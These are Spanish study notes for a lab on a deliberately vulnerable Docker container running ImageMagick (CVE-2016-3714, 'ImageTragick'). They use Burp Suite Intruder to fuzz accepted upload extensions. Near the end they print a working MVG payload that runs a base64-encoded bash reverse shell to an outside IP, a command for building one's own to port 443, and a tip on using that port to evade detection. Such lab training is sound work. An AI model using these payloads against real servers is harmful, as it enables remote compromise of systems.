# Índice

- [[#Introducción]]
- [[#Práctica]]
- [[#Desplegando el entorno]]
- [[#Descubrimiento de tipos de archivo aceptables]]
- [[#Intercept]]
- [[#Repeater]]
- [[#Intruder]]
- [[#Grep-Extract]]
- [[#Attack]]
- [[#Siguientes apuntes]]
# Introducción

El proyecto que estaremos viendo ahora tambien pertenece al mismo repositorio de vulnhub y este es correspondiente a la vulnerabilidad **ImageMagick (ImageTracking)**:

- [Proyecto](https://github.com/vulhub/vulhub/tree/master/imagemagick/CVE-2016-3714)
# Práctica

## Desplegando el entorno

Para traernos esto a nuestra máquina podríamos utilizar nuevamente la herramienta en línea **Downgit**. Una vez en nuestro ordenador, desplegaríamos todo de la misma forma con el comando **docker-compose up -d**.

![[Docker/MaquinasVulnerbales/images/015.png]]

Si vemos en qué puerto está corriendo el servicio con el comando **docker port**, veremos que está en el puerto 8080 de nuestra máquina y el 8080 del contenedor:

![[Docker/MaquinasVulnerbales/images/016.png]]


En este caso, vamos a trabajar con este entorno vulnerable, el cual tiene un servicio corriendo que nos permite la carga de archivos. Realmente sabemos que procesa imágenes y por detrás utiliza **ImageMagick** para procesarlas. 

La idea con esto, por probar y experimentar, es que podríamos crear un archivo el cual sea **test.txt** y colocar cualquier cosa dentro y abriendo el servicio en nuestro navegador, ver qué sucede si subimos el archivo txt que hemos creado:

![[Docker/MaquinasVulnerbales/images/017.png]]

Veremos cómo al subir un archivo txt nos dice que es un tipo de archivo no soportado y cómo por detrás maneja ImageMagick, pues sabemos que por detrás este servicio procesa las imágenes. En caso en el que no sepamos que pueda hacer cualquier herramienta o cosa que lleguemos a encontrar, lo suyo para aprender a desenvolvernos en entornos nuevos sería investigarlo. 

## Descubrimiento de tipos de archivo aceptables

En este caso, podríamos aplicar fuzzing con herramientas como **wfuzz** para probar múltiples extensiones de archivos y averiguar con qué tipos de archivos realmente funciona este servicio. En este caso, en lugar de emplear estas herramientas, utilizaremos **BurpSuite**.

Como ya vimos anteriormente, BurpSuite es una herramienta que nos permite habilitar un proxy que usualmente está para ser activado en la máquina local en el puerto 8080. En este caso, este puerto ya está ocupado, por lo que tendríamos que modificar esto. 

Nos iríamos para ello al apartado de configuración y en proxy buscaríamos seleccionar el que está y modificar el puerto para que sea el 8081:

![[Docker/MaquinasVulnerbales/images/018.png]]

![[Docker/MaquinasVulnerbales/images/019.png]]

Cuando almacenemos todo, tendríamos que tener la opción del proxy configurado seleccionada:

![[Docker/MaquinasVulnerbales/images/020.png]]

Con ello ya tendríamos listo el proxy, para evitar problemas con el tráfico que capture burpsuite del navegador. Lo mejor será utilizar el propio navegador que nos ofrece burpsuite que ya está previamente configurado. 

## Intercept

Para ello, nos iríamos al apartado de **proxy** y le daríamos a **open browser**:

![[Docker/MaquinasVulnerbales/images/021.png]]

En este caso, además de solo llegar a ver el tráfico, podríamos primero abrir la página que se encuentra corriendo en nuestro host y empezar a interceptar el tráfico. Por ahora está en **intercept off** pero tendríamos que encenderlo.

Al encenderlo y subir un archivo en la pagina, veremos lo siguiente:

![[Docker/MaquinasVulnerbales/images/022.png]]


## Repeater

Nosotros aquí podríamos utilizar la combinación de teclas **CTRL + R**, lo cual nos enviará esto a la pestaña del **Repeater**. Veremos cómo se ilumina en color naranja y al seleccionarlo tendremos lo siguiente:

![[Docker/MaquinasVulnerbales/images/023.png]]

Aquí podríamos simular el envío de la petición tal y como lo hace el navegador, pero teniendo el control nosotros de la respuesta, por ende si le damos a **send** o presionamos **CTRL + SPACE**, veremos la respuesta:

![[Docker/MaquinasVulnerbales/images/024.png]]

Además, tendremos varias formas de visualizar la respuesta. El apartado de **Render** incluso lo muestra como si el propio navegador lo hiciera. Usualmente, se llega a utilizar la Raw por mayor comodidad de trabajo con BurpSuite. 

En la parte superior del **send**, esta pestaña tendrá un nombre, este nombre podremos cambiarlo si presionamos dos veces sobre el nombre de esta misma, podríamos colocar un nombre como **Testing File Upload**, haciendo referencia a que estamos haciendo pruebas con la subida del archivo en el servicio web que hemos desplegado.

## Intruder

Nosotros buscaremos realizar un ataque de fuerza bruta cambiando las extensiones del archivo para ver cuáles pueden estar permitidas en este servicio web. Para ello, ahora que estamos en el Repeater vamos a presionar **CTRL + I**, esto nos permitirá enviar la petición con la que estamos trabajando al **intruder**. 

En el intruder veremos la petición e incluso el nombre del archivo, así como su contenido:

![[Docker/MaquinasVulnerbales/images/025.png]]

En la primera parte tendremos una posible selección para distintos tipos de ataques. En este caso realizaremos un ataque de tipo **sniper** y el host, en este caso, pues es la misma página que tiene este servicio en el cual subimos el archivo. 

Ahora no tenemos nada seleccionado, por lo tanto, seleccionaremos lo que es **txt** sin considerar el punto. Esto será para, en función de lo seleccionado, cambiar la extensión para probar con distintos tipos de archivos.

Después de seleccionar **txt**, le daremos a **Add$** que se encuentra en la parte superior, para agregar la selección con la que estaremos realizando el ataque. Finalmente, del lado derecho, si no nos ha salido algo distinto, le damos a **close**. 

Aquí está el apartado de nuestros payloads. Lo que haremos será agregar una lista para un ataque de fuerza bruta para el apartado (payload) que hemos seleccionado. Tendremos un contador de payloads, donde, si tenemos más de uno, podremos seleccionar entre estos para trabajarlos de forma separada.

En este caso nuestro payload lo trabajaremos como **simple list** y donde tenemos **Add**, en este campo agregaremos por separado cada extensión, cada que terminemos de agregar una le daremos **add**, hasta terminar de agregar las extensiones: txt, php, js, php3, php4, php4, pht, phtml, gif, png, jpg, jpeg, entre otras extensiones.

![[Docker/MaquinasVulnerbales/images/026.png]]

## Grep-Extract

Con todo lo que tenemos hasta ahora ya podríamos realizar el ataque de fuerza bruta, pero en la pestaña de configuración del lado derecho tenemos la posibilidad de seleccionar un apartado de la respuesta para que siempre nos lo represente y en este caso nos interesa, ya que si la respuesta es distinta al mensaje de que el tipo de archivo no es soportable por el servicio web, quiere decir que si lo acepta e incluso en ocasiones nos representa otro tipo de respuesta que se llegue a ver.

En este caso buscaríamos la opción **Grep-Extract** en la configuración:

![[Docker/MaquinasVulnerbales/images/027.png]]

Aquí le daríamos a **Add** y nos mostrará la respuesta, en ella seleccionaremos el mensaje de archivo no soportable:

![[Docker/MaquinasVulnerbales/images/028.png]]

Esto nos crea una expresión regular para la selección en la respuesta y finalmente le daremos a **ok** e iniciaríamos el ataque. Si nos sale una ventana de un mensaje, solo le damos a ok.

## Attack

Con ello, nos abriría otra ventana y ya estaría empleándose el ataque de fuerza bruta. Con cada extensión de nuestra lista, veremos los resultados de lo que hemos seleccionado en la respuesta con cada extensión probada:

![[Docker/MaquinasVulnerbales/images/029.png]]

Con estos resultados podremos ver cómo el resto de las extensiones nos dan como resultado que el tipo de archivo no es soportado, pero en el caso de las imágenes y el gif, son tipos de archivo soportados, por el tipo de respuesta que nos da. 

Con esto nosotros podríamos intentar nuevamente enviar una petición en el **Repeater** en la cual ahora la extensión la cambiemos a la de una imagen y veremos la respuesta de como intenta devolvernos un size de la imagen, en este caso no lo consigue porque lo que le estamos enviando solo es un archivo disfrazado de imagen, que realmente contiene únicamente texto.

Si nosotros nos ponemos a investigar sobre utilidades o herramientas que ayuden a procesar imágenes para un servicio que se llegue a levantar que tenga entradas de imágenes, nos llegaremos a encontrar con la herramienta **ImageMagick**. 

Aquí es donde es muy importante el cómo nosotros como atacantes tendremos que investigar muchas cosas en ciertas circunstancias, ya que estas nos pueden ayudar a tratar de realizar cosas basándose en los resultados de nuestra investigación, en este caso asumiendo que realizamos esta investigación y una de las herramientas que más llegamos a encontrar es ImageMagick, pues asumiremos que posiblemente este servicio tiene esta herramienta para procesar imágenes, que es el caso de la herramienta que utiliza este entorno vulnerable.

Finalmente, investigando sobre vulnerabilidades para **ImageMagick** nos encontraremos con la vulnerabilidad **ImageTragick**, lo cual nos permite crear un archivo con extensión **gif**, **png**, etc. 

Si vemos el repositorio, tendremos el siguiente contenido que podríamos nosotros colocar en este archivo:

```shell
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.0/oops.jpg?`echo L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzQ1LjMyLjQzLjQ5Lzg4ODkgMD4mMQ== | base64 -d | bash`"||id " )'
pop graphic-context
```

Esto lo que hace es realizar la inyección de un comando, el cual es una cadena en **base64** y se decodifica para después ejecutarse con una terminal **bash**. 

Si vemos que comando ejecuta, es el siguiente:

![[Docker/MaquinasVulnerbales/images/030.png]]

Esto lo que hace es enviar un terminal bash a un dispositivo que esté en escucha en un puerto dado. Por ende, nosotros haremos lo mismo, solo que cambiaremos el host por el nuestro y el puerto por uno en el que estemos en escucha:

```shell
echo -n "/bin/bash -i >& /dev/tcp/192.168.100.103/443 0>&1" | base64
```

Agregamos el parámetro **-n** del comando **echo** para evitar que nos agregue un salto de línea al final, ya que si este es agregado, la cadena en base64 que nos de, será distinta y puede llegar a causar errores ese salto de línea al final.

![[Docker/MaquinasVulnerbales/images/031.png]]

Lo que haremos será intercambiar la cadena en base64 por la que tenemos nosotros y colocarnos en escucha con netcat por el puerto **443**:

![[Docker/MaquinasVulnerbales/images/032.png]]

En este punto tendremos que dejar de interceptar el tráfico con **BurpSuite**. Al subir el archivo a la web, veremos cómo es que el comando se ejecuta. La máquina que está corriendo con esta vulnerabilidad es capaz de ejecutar el comando por la forma en la que se interpreta la imagen y recibimos una terminal bash:

![[Docker/MaquinasVulnerbales/images/033.png]]
Antes de llegar a realizar directamente el envío de la seudo terminal, incluso podríamos llegar a intentar enviarnos una petición a un servidor que montemos momentáneamente, pero en este caso lo hicimos directamente y, como vemos, pues tenemos la ejecución de comandos. 

En cuanto al puerto, se puede usar cualquiera, pero se suele utilizar el **443**, debido a que en ciertos casos se puede aprovechar esto para que se piense que está viajando tráfico SSL/HTTPS, cuando en realidad está viajando nuestra reverse Shell. Aunque aun así se puede detectar, es como una medida que puede ser de ayuda, como algo de evasión, teniendo menos probabilidades de que se sea detectado.

# Siguientes apuntes

[[Enumeración del servicio FTP]]